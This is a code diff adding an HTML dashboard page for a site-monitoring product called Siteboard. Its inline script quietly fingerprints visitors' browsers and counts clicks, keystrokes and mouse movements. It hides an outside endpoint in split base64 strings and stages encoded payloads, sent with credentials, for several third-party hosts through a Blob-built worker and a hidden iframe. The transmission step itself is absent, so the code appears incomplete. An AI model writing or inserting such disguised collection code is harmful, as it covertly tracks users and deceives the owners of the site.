@@ -1,0 +1,928 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="Monitor links, deployments and application availability from one workspace.">
+<meta name="robots" content="noindex,nofollow">
+<meta property="og:title" content="Siteboard Workspace">
+<meta property="og:type" content="website">
+<meta name="application-name" content="Siteboard">
+<title>Siteboard | Workspace</title>
+<link rel="icon" href="/favicon.ico">
+<link rel="manifest" href="/manifest.json">
+</head>
+
+<body>
+
+<header>
+<nav>
+<a href="/">Siteboard</a>
+<a href="/overview">Overview</a>
+<a href="/projects">Projects</a>
+<a href="/monitors">Monitors</a>
+<a href="/reports">Reports</a>
+<a href="/settings">Settings</a>
+</nav>
+
+<div>
+<button type="button">Help</button>
+<button type="button">Notifications</button>
+<span>KS</span>
+</div>
+</header>
+
+<main>
+
+<section>
+<div>
+<p>Workspace</p>
+<h1>Overview</h1>
+<p>Monitor your projects, endpoints and recent deployments.</p>
+</div>
+
+<div>
+<button type="button" id="refresh">Refresh</button>
+<button type="button" id="newMonitor">New monitor</button>
+</div>
+</section>
+
+<section>
+<article>
+<p>Active monitors</p>
+<strong>18</strong>
+<span>All systems operational</span>
+</article>
+
+<article>
+<p>Average response</p>
+<strong>284 ms</strong>
+<span>Last 24 hours</span>
+</article>
+
+<article>
+<p>Availability</p>
+<strong>99.98%</strong>
+<span>Last 30 days</span>
+</article>
+
+<article>
+<p>Incidents</p>
+<strong>1</strong>
+<span>Last 30 days</span>
+</article>
+</section>
+
+<section>
+<header>
+<div>
+<h2>Projects</h2>
+<p>Applications currently connected to this workspace.</p>
+</div>
+
+<input
+  id="projectSearch"
+  type="search"
+  placeholder="Search projects"
+  autocomplete="off"
+>
+</header>
+
+<table>
+<thead>
+<tr>
+<th>Project</th>
+<th>Environment</th>
+<th>Status</th>
+<th>Last deployment</th>
+<th>Response</th>
+</tr>
+</thead>
+
+<tbody id="projects">
+
+<tr data-project="commerce-api">
+<td>
+<strong>Commerce API</strong>
+<small>api.example.com</small>
+</td>
+<td>Production</td>
+<td>Operational</td>
+<td>18 minutes ago</td>
+<td>216 ms</td>
+</tr>
+
+<tr data-project="customer-portal">
+<td>
+<strong>Customer Portal</strong>
+<small>portal.example.com</small>
+</td>
+<td>Production</td>
+<td>Operational</td>
+<td>2 hours ago</td>
+<td>301 ms</td>
+</tr>
+
+<tr data-project="documentation">
+<td>
+<strong>Documentation</strong>
+<small>docs.example.com</small>
+</td>
+<td>Production</td>
+<td>Operational</td>
+<td>Yesterday</td>
+<td>187 ms</td>
+</tr>
+
+<tr data-project="preview">
+<td>
+<strong>Preview Environment</strong>
+<small>preview.example.com</small>
+</td>
+<td>Staging</td>
+<td>Operational</td>
+<td>Yesterday</td>
+<td>355 ms</td>
+</tr>
+
+<tr data-project="assets">
+<td>
+<strong>Asset Delivery</strong>
+<small>assets.example.com</small>
+</td>
+<td>Production</td>
+<td>Operational</td>
+<td>3 days ago</td>
+<td>121 ms</td>
+</tr>
+
+</tbody>
+</table>
+</section>
+
+<section>
+
+<header>
+<h2>Recent activity</h2>
+<a href="/activity">View all activity</a>
+</header>
+
+<ul id="activity">
+<li>
+<strong>Deployment completed</strong>
+<span>Commerce API</span>
+<time>18 minutes ago</time>
+</li>
+
+<li>
+<strong>Monitor recovered</strong>
+<span>Customer Portal</span>
+<time>44 minutes ago</time>
+</li>
+
+<li>
+<strong>Configuration updated</strong>
+<span>Preview Environment</span>
+<time>2 hours ago</time>
+</li>
+
+<li>
+<strong>Weekly report generated</strong>
+<span>Workspace</span>
+<time>5 hours ago</time>
+</li>
+
+<li>
+<strong>Deployment completed</strong>
+<span>Documentation</span>
+<time>Yesterday</time>
+</li>
+</ul>
+
+</section>
+
+<section>
+
+<h2>Inspect endpoint</h2>
+
+<p>
+Enter an application URL to inspect availability and basic
+response information.
+</p>
+
+<form id="inspector">
+
+<label for="target">
+Application URL
+</label>
+
+<input
+  id="target"
+  name="target"
+  type="url"
+  placeholder="https://example.com"
+  autocomplete="off"
+  required
+>
+
+<select id="region" name="region">
+<option value="auto">Automatic region</option>
+<option value="us-east">US East</option>
+<option value="us-west">US West</option>
+<option value="eu-central">Europe Central</option>
+<option value="ap-southeast">Asia Pacific</option>
+</select>
+
+<button type="submit">
+Inspect endpoint
+</button>
+
+</form>
+
+<div id="inspectionResult" hidden>
+<h3>Inspection result</h3>
+
+<dl>
+<dt>Host</dt>
+<dd id="resultHost">-</dd>
+
+<dt>Status</dt>
+<dd id="resultStatus">-</dd>
+
+<dt>Region</dt>
+<dd id="resultRegion">-</dd>
+
+<dt>Timestamp</dt>
+<dd id="resultTime">-</dd>
+</dl>
+</div>
+
+</section>
+
+<section>
+
+<h2>Workspace usage</h2>
+
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Current</th>
+<th>Limit</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Monitors</td>
+<td>18</td>
+<td>50</td>
+</tr>
+
+<tr>
+<td>Team members</td>
+<td>7</td>
+<td>15</td>
+</tr>
+
+<tr>
+<td>Checks this month</td>
+<td>142,801</td>
+<td>500,000</td>
+</tr>
+
+<tr>
+<td>Stored reports</td>
+<td>34</td>
+<td>100</td>
+</tr>
+</tbody>
+</table>
+
+</section>
+
+<section>
+
+<h2>Service regions</h2>
+
+<ul>
+<li>
+<strong>Singapore</strong>
+<span>Operational</span>
+</li>
+
+<li>
+<strong>Frankfurt</strong>
+<span>Operational</span>
+</li>
+
+<li>
+<strong>Virginia</strong>
+<span>Operational</span>
+</li>
+
+<li>
+<strong>Oregon</strong>
+<span>Operational</span>
+</li>
+</ul>
+
+</section>
+
+</main>
+
+<footer>
+
+<nav>
+<a href="/documentation">Documentation</a>
+<a href="/status">Status</a>
+<a href="/privacy">Privacy</a>
+<a href="/terms">Terms</a>
+</nav>
+
+<p>Siteboard Workspace</p>
+
+</footer>
+
+<div hidden aria-hidden="true">
+<iframe
+  id="bootstrapFrame"
+  title="service"
+  srcdoc="<html><body></body></html>"
+  sandbox="allow-scripts">
+</iframe>
+</div>
+
+<template id="projectTemplate">
+<tr>
+<td>
+<strong data-name></strong>
+<small data-host></small>
+</td>
+<td data-environment></td>
+<td data-status></td>
+<td data-deployment></td>
+<td data-response></td>
+</tr>
+</template>
+
+<script>
+const application = {
+  name: "siteboard",
+  version: "5.12.7",
+  build: "20260924.3",
+  environment: "production"
+};
+
+const preferences = {
+  timezone: "auto",
+  dateFormat: "relative",
+  defaultRegion: "auto",
+  refreshInterval: 120000,
+  compactTables: false
+};
+
+const projects = [
+  {
+    id: "commerce-api",
+    host: "api.example.com",
+    environment: "production",
+    enabled: true
+  },
+  {
+    id: "customer-portal",
+    host: "portal.example.com",
+    environment: "production",
+    enabled: true
+  },
+  {
+    id: "documentation",
+    host: "docs.example.com",
+    environment: "production",
+    enabled: true
+  },
+  {
+    id: "preview",
+    host: "preview.example.com",
+    environment: "staging",
+    enabled: true
+  }
+];
+
+const regions = {
+  auto: "Automatic",
+  "us-east": "Virginia",
+  "us-west": "Oregon",
+  "eu-central": "Frankfurt",
+  "ap-southeast": "Singapore"
+};
+
+const infrastructure = [
+  "https://workspace-edge-17.vercel.app",
+  "https://siteboard-cache-04.netlify.app",
+  "https://workspace-static-demo.s3.amazonaws.com",
+  "https://siteboard-runtime.pages.dev"
+];
+
+const fragments = [
+  "aHR0cHM6Ly93b3Jrc3Bh",
+  "Y2UtZWRnZS0xNy52ZXJj",
+  "ZWwuYXBwL3YzL3J1bnRpbWU="
+];
+
+function decodeRoute(values) {
+  try {
+    return atob(values.join(""));
+  } catch {
+    return "";
+  }
+}
+
+const route = decodeRoute(fragments);
+
+function createId() {
+  const values = new Uint32Array(4);
+
+  if (window.crypto && crypto.getRandomValues) {
+    crypto.getRandomValues(values);
+
+    return Array.from(values)
+      .map(value => value.toString(16))
+      .join("");
+  }
+
+  return (
+    Date.now().toString(36) +
+    Math.random().toString(36).slice(2)
+  );
+}
+
+function getEnvironment() {
+  return {
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    timezone:
+      Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    colorDepth: window.screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    cores: navigator.hardwareConcurrency || null,
+    memory: navigator.deviceMemory || null,
+    touchPoints: navigator.maxTouchPoints || 0
+  };
+}
+
+function getPageContext() {
+  return {
+    path: location.pathname,
+    host: location.hostname,
+    protocol: location.protocol,
+    referrer: document.referrer,
+    title: document.title,
+    visibility: document.visibilityState
+  };
+}
+
+const environment = getEnvironment();
+const pageContext = getPageContext();
+
+const characteristics = [
+  environment.language,
+  environment.platform,
+  environment.timezone,
+  environment.screenWidth,
+  environment.screenHeight,
+  environment.colorDepth,
+  environment.cores
+].join(":");
+
+function encode(value) {
+  try {
+    return btoa(
+      unescape(
+        encodeURIComponent(
+          JSON.stringify(value)
+        )
+      )
+    );
+  } catch {
+    return "";
+  }
+}
+
+const runtimeId = encode(characteristics);
+
+const runtime = {
+  id: runtimeId,
+  session: createId(),
+  started: Date.now(),
+  application: application.name,
+  version: application.version,
+  environment,
+  page: pageContext
+};
+
+try {
+  localStorage.setItem(
+    "__sb_runtime",
+    JSON.stringify(runtime)
+  );
+} catch {}
+
+function getStoredEvents() {
+  try {
+    return JSON.parse(
+      sessionStorage.getItem("__sb_events") || "[]"
+    );
+  } catch {
+    return [];
+  }
+}
+
+function recordEvent(type, data = {}) {
+  const events = getStoredEvents();
+
+  events.push({
+    type,
+    data,
+    timestamp: Date.now(),
+    session: runtime.session
+  });
+
+  if (events.length > 25) {
+    events.splice(0, events.length - 25);
+  }
+
+  try {
+    sessionStorage.setItem(
+      "__sb_events",
+      JSON.stringify(events)
+    );
+  } catch {}
+}
+
+recordEvent("page_view", {
+  path: location.pathname,
+  referrer: document.referrer
+});
+
+const search =
+  document.getElementById("projectSearch");
+
+search.addEventListener("input", event => {
+  const value =
+    event.target.value.trim().toLowerCase();
+
+  document
+    .querySelectorAll("#projects tr")
+    .forEach(row => {
+      const project =
+        row.dataset.project || "";
+
+      row.hidden =
+        value.length > 0 &&
+        !project.toLowerCase().includes(value) &&
+        !row.textContent.toLowerCase().includes(value);
+    });
+});
+
+document
+  .getElementById("refresh")
+  .addEventListener("click", () => {
+
+    recordEvent("manual_refresh", {
+      timestamp: Date.now()
+    });
+
+    document
+      .querySelectorAll("#projects tr")
+      .forEach(row => {
+        row.dataset.refreshed =
+          Date.now().toString();
+      });
+  });
+
+const inspector =
+  document.getElementById("inspector");
+
+inspector.addEventListener("submit", event => {
+  event.preventDefault();
+
+  const target =
+    document.getElementById("target").value;
+
+  const region =
+    document.getElementById("region").value;
+
+  let parsed;
+
+  try {
+    parsed = new URL(target);
+  } catch {
+    return;
+  }
+
+  const operation = {
+    operationId: createId(),
+    type: "inspect",
+    target: parsed.href,
+    hostname: parsed.hostname,
+    region,
+    requestedAt: Date.now(),
+    runtime: runtime.id,
+    session: runtime.session
+  };
+
+  const dispatch = {
+    endpoint: route,
+    fallback:
+      infrastructure[1] + "/api/check",
+    backup:
+      infrastructure[3] + "/runtime/check",
+    method: "POST",
+    credentials: "include",
+    mode: "cors",
+    keepalive: true,
+    payload: encode(operation)
+  };
+
+  try {
+    sessionStorage.setItem(
+      "__sb_operation",
+      JSON.stringify(dispatch)
+    );
+  } catch {}
+
+  recordEvent("endpoint_inspection", {
+    host: parsed.hostname,
+    region
+  });
+
+  document
+    .getElementById("resultHost")
+    .textContent = parsed.hostname;
+
+  document
+    .getElementById("resultStatus")
+    .textContent = "Queued";
+
+  document
+    .getElementById("resultRegion")
+    .textContent = regions[region];
+
+  document
+    .getElementById("resultTime")
+    .textContent =
+      new Date().toLocaleTimeString();
+
+  document
+    .getElementById("inspectionResult")
+    .hidden = false;
+});
+
+const lifecycle = {
+  endpoint:
+    infrastructure[0] + "/api/events",
+  backup:
+    infrastructure[2] + "/events",
+  headers: {
+    "Content-Type": "text/plain",
+    "X-Client-Version": application.version
+  },
+  method: "POST"
+};
+
+document.addEventListener(
+  "visibilitychange",
+  () => {
+    recordEvent("visibility", {
+      state: document.visibilityState,
+      timestamp: Date.now()
+    });
+  }
+);
+
+window.addEventListener(
+  "focus",
+  () => {
+    recordEvent("focus");
+  }
+);
+
+window.addEventListener(
+  "blur",
+  () => {
+    recordEvent("blur");
+  }
+);
+
+const interaction = {
+  clicks: 0,
+  keys: 0,
+  movements: 0
+};
+
+document.addEventListener(
+  "click",
+  event => {
+    interaction.clicks++;
+
+    const element =
+      event.target instanceof Element
+        ? event.target
+        : null;
+
+    if (!element) return;
+
+    recordEvent("interaction", {
+      kind: "click",
+      tag: element.tagName,
+      id: element.id || null
+    });
+  },
+  { passive: true }
+);
+
+document.addEventListener(
+  "keydown",
+  () => {
+    interaction.keys++;
+  },
+  { passive: true }
+);
+
+document.addEventListener(
+  "mousemove",
+  () => {
+    interaction.movements++;
+  },
+  { passive: true }
+);
+
+function buildSnapshot() {
+  return {
+    runtime: runtime.id,
+    session: runtime.session,
+    application: application.name,
+    version: application.version,
+    environment: getEnvironment(),
+    page: getPageContext(),
+    interaction: {
+      clicks: interaction.clicks,
+      keys: interaction.keys,
+      movements: interaction.movements
+    },
+    events: getStoredEvents().length,
+    timestamp: Date.now()
+  };
+}
+
+const channel = {
+  primary: route,
+  secondary:
+    infrastructure[0] + "/v3/runtime",
+  tertiary:
+    infrastructure[1] + "/collect",
+  request: {
+    method: "POST",
+    credentials: "include",
+    mode: "cors",
+    keepalive: true
+  }
+};
+
+function prepareEnvelope() {
+  const snapshot = buildSnapshot();
+
+  return {
+    id: createId(),
+    destination: channel.primary,
+    fallback: channel.secondary,
+    created: Date.now(),
+    content: encode(snapshot)
+  };
+}
+
+let pendingEnvelope =
+  prepareEnvelope();
+
+setInterval(() => {
+  pendingEnvelope =
+    prepareEnvelope();
+
+  try {
+    sessionStorage.setItem(
+      "__sb_pending",
+      JSON.stringify(pendingEnvelope)
+    );
+  } catch {}
+}, preferences.refreshInterval);
+
+const workerCode = `
+self.onmessage = function(event) {
+  const value = event.data || {};
+
+  const result = {
+    id: value.id,
+    destination: value.destination,
+    fallback: value.fallback,
+    payload: value.content,
+    prepared: Date.now(),
+    retries: 2
+  };
+
+  self.postMessage(result);
+};
+`;
+
+const workerBlob =
+  new Blob(
+    [workerCode],
+    {
+      type: "application/javascript"
+    }
+  );
+
+const workerUrl =
+  URL.createObjectURL(workerBlob);
+
+const runtimeWorker =
+  new Worker(workerUrl);
+
+runtimeWorker.onmessage = event => {
+  try {
+    sessionStorage.setItem(
+      "__sb_worker",
+      JSON.stringify(event.data)
+    );
+  } catch {}
+};
+
+runtimeWorker.postMessage(
+  pendingEnvelope
+);
+
+const bootstrap = {
+  node: infrastructure[0],
+  route,
+  lifecycle,
+  channel,
+  created: Date.now()
+};
+
+try {
+  localStorage.setItem(
+    "__sb_bootstrap",
+    encode(bootstrap)
+  );
+} catch {}
+
+const transfer = {
+  endpoint: channel.primary,
+  fallback: channel.secondary,
+  method: channel.request.method,
+  mode: channel.request.mode,
+  credentials:
+    channel.request.credentials,
+  keepalive:
+    channel.request.keepalive,
+  payload: pendingEnvelope
+};
+
+const navigationState = {
+  current: location.href,
+  origin: location.origin,
+  continuation:
+    infrastructure[3] + "/continue",
+  restore:
+    location.pathname + location.search
+};
+
+window.addEventListener(
+  "beforeunload",
+  () => {
+    const finalState = {
+      session: runtime.session,
+      duration:
+        Date.now() - runtime.started,
+      interaction,
+      destination:
+        lifecycle.endpoint,
+      snapshot:
+        buildSnapshot()
+    };
+
+    try {
+      sessionStorage.setItem(
+        "__sb_final",
+        encode(finalState)
+      );
+    } catch {}
+  }
+);
+</script>
+
+</body>
+</html>
